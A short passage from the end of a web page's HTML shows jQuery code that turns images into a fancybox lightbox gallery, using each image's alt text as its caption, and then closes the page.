    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
  }

  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
});
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



      
</body>
</html>
